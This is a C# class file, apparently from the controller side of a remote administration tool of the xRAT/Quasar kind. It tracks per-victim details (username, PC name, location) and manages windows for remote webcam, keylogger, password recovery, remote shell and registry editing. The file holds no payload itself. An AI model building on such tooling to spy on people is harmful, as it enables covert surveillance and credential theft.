using System;
using System.Windows.Forms;
using xServer.Core.ReverseProxy;
using xServer.Forms;

namespace xServer.Core.Networking
{
    public class UserState : IDisposable
    {
        public string Version { get; set; }
        public string OperatingSystem { get; set; }
        public string AccountType { get; set; }
        public int ImageIndex { get; set; }
        public string Country { get; set; }
        public string CountryCode { get; set; }
        public string Region { get; set; }
        public string City { get; set; }
        public string Id { get; set; }
        public string Username { get; set; }
        public string PCName { get; set; }
        public string UserAtPc { get { return string.Format("{0}@{1}", Username, PCName); } }
        public string CountryWithCode { get { return string.Format("{0} [{1}]", Country, CountryCode); } }
        public string Tag { get; set; }
        public string DownloadDirectory { get; set; }

        public FrmRemoteWebcam FrmWebcam { get; set; }
        public FrmTaskManager FrmTm { get; set; }
        public FrmRegistryEditor FrmRe { get; set; }
        public FrmRemoteShell FrmRs { get; set; }
        public FrmKeylogger FrmKl { get; set; }
        public FrmPasswordRecovery FrmPass { get; set; }

        public void Dispose()
        {
            Dispose(true);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    if (FrmWebcam != null)
                        FrmWebcam.Invoke((MethodInvoker)delegate { FrmWebcam.Close(); });
                    if (FrmTm != null)
                        FrmTm.Invoke((MethodInvoker)delegate { FrmTm.Close(); });
                    if (FrmRe != null)
                        FrmRe.Invoke((MethodInvoker)delegate { FrmRe.Close(); });
                    if (FrmRs != null)
                        FrmRs.Invoke((MethodInvoker)delegate { FrmRs.Close(); });
                    if (FrmKl != null)
                        FrmKl.Invoke((MethodInvoker)delegate { FrmKl.Close(); });
                    if (FrmPass != null)
                        FrmPass.Invoke((MethodInvoker)delegate { FrmPass.Close(); });
                }
                catch (InvalidOperationException)
                {
                }
            }
        }
    }
}